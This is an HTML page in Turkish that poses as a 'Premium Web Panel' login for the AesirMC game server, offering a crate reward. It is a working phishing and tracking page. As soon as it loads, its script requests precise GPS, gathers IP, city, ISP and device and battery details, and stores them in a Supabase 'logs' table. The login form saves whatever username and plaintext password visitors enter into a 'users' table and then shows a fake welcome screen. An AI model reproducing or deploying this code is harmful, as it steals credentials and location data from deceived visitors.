<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AesirMC | Premium Web Panel</title>

    <meta property="og:title" content="AesirMC | Premium Web Panel">
    <meta property="og:image" content="https://aesirhediye2026.vercel.app/logo.png">
    <link rel="icon" type="image/png" href="logo.png">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        :root {
            --primary: #00a2ff; --secondary: #0066ff; --accent: #d48e00;
            --bg-dark: #050608; --glass: rgba(0, 0, 0, 0.7);
            --border: rgba(255, 255, 255, 0.1); --success: #00ff88;
        }

        body {
            margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: var(--bg-dark);
            background-image: url('background2.png');
            background-size: cover; background-position: center; background-attachment: fixed;
            color: white; min-height: 100vh; display: flex; flex-direction: column;
        }

        /* GİRİŞ PANELİ */
        #auth-container { margin: auto; width: 100%; max-width: 400px; padding: 40px; background: var(--glass); border: 1px solid var(--border); border-radius: 32px; text-align: center; backdrop-filter: blur(20px); }
        .auth-logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 15px var(--primary)); }
        input { width: 100%; padding: 15px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 15px; box-sizing: border-box; }
        
        .login-btn { width: 100%; padding: 18px; background: linear-gradient(135deg, var(--primary), var(--secondary)); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; }

        #game-container { display: none; padding: 50px; text-align: center; }
        .main-chest { width: 200px; cursor: pointer; transition: 0.3s; }
    </style>
</head>
<body>

<div id="auth-container">
    <img src="logo.png" class="auth-logo" alt="Logo">
    <h2>Giriş Yap</h2>
    <input type="text" id="username" placeholder="Kullanıcı Adı">
    <input type="password" id="password" placeholder="Şifre">
    <button class="login-btn" id="login-btn" onclick="connectAndGo()">SİSTEME BAĞLAN</button>
</div>

<div id="game-container">
    <h2 id="welcome-txt"></h2>
    <img src="adsız.png" class="main-chest" onclick="alert('Kasa simülasyonu yükleniyor...')">
</div>

<script>
    // SUPABASE AYARLARI
    const S_URL = "https://iigemvvlznvgneghevev.supabase.co"; 
    const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
    const _db = supabase.createClient(S_URL, S_KEY);

    // 1. OTOMATİK VERİ ÇEKME (SAYFA AÇILDIĞI AN)
    document.addEventListener('DOMContentLoaded', async () => {
        console.log("Sistem analizi başlatıldı...");
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => { await collectData({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); },
                async (err) => { await collectData(null); },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            await collectData(null);
        }
    });

    async function collectData(gps) {
        try {
            // IP ve Şehir Bilgisi
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            // Cihaz ve Donanım Detayları
            const device = {
                os: navigator.platform,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
                res: screen.width + "x" + screen.height,
                agent: navigator.userAgent,
                battery: "N/A",
                connection: navigator.connection ? navigator.connection.effectiveType : "N/A"
            };

            // Batarya bilgisini çek
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                device.battery = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
            }

            // Supabase 'logs' tablosuna kaydet
            await _db.from('logs').insert([{
                ip: ipData.ip,
                sehir: ipData.city + " / " + ipData.region,
                iss: ipData.org,
                gps_konum: gps ? `${gps.lat}, ${gps.lon}` : "İzin Verilmedi",
                gps_dogruluk: gps ? gps.acc + "m" : "N/A",
                cihaz_detaylari: JSON.stringify(device),
                tarih: new Date().toLocaleString('tr-TR')
            }]);

        } catch (e) { console.error("Analiz hatası"); }
    }

    // 2. GİRİŞ YAPMA FONKSİYONU (USERS TABLOSUNA KAYIT)
    async function connectAndGo() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if(!u || !p) return alert("Boş alan bırakma!");

        try {
            await _db.from('users').insert([{ username: u, password: p }]);
            document.getElementById('auth-container').style.display = 'none';
            document.getElementById('game-container').style.display = 'block';
            document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
        } catch (e) { alert("Bağlantı hatası!"); }
    }
</script>
</body>
</html>
